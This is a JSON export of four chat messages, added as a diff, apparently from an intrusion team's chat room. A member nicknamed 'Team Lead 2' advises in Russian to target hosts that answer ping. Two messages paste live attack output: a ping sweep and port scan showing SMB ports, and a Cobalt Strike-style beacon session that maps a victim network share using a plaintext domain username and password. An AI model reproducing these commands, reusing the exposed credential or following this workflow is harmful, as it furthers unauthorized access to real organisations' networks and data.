@@ -1,0 +1,67 @@
+{
+  "messages": [
+    {
+      "_id": "25gGgHBrF4WQSDqrW",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "```\n(ICMP) Target '172.16.200.1' is alive. [read 8 bytes]\n\n[+] received output:\n172.16.200.1:139\n172.16.200.1:135\n\n[+] received output:\n172.16.200.1:445\n```",
+      "ts": "2020-09-22T16:22:30.339Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T16:22:30.430Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jLcJ24zdoTj25e7b6",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": ".",
+      "ts": "2020-09-22T16:11:46.734Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T16:22:52.310Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-09-22T16:22:52.305Z",
+      "editedBy": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7"
+      },
+      "urls": []
+    },
+    {
+      "_id": "Y2hv3f73B8woecWnA",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "воо\nа если еще и пингуются - то прямо на них уже и надо прицеливаться",
+      "ts": "2020-09-22T12:36:18.313Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T12:36:18.354Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nqz3gPjT48HmgppYa",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "```\nbeacon> run net use * \"\\\\192.168.168.10\\Shares\" /persistent:no /user:PKGPROD\\jess 0204\n[*] Tasked beacon to run: net use * \"\\\\192.168.168.10\\Shares\" /persistent:no /user:PKGPROD\\jess 0204\n[+] host called home, sent: 92 bytes\n[+] received output:\nDrive Z: is now connected to \\\\192.168.168.10\\Shares.\n\nThe command completed successfully.\n\n```",
+      "ts": "2020-09-22T10:24:17.542Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T10:24:17.664Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
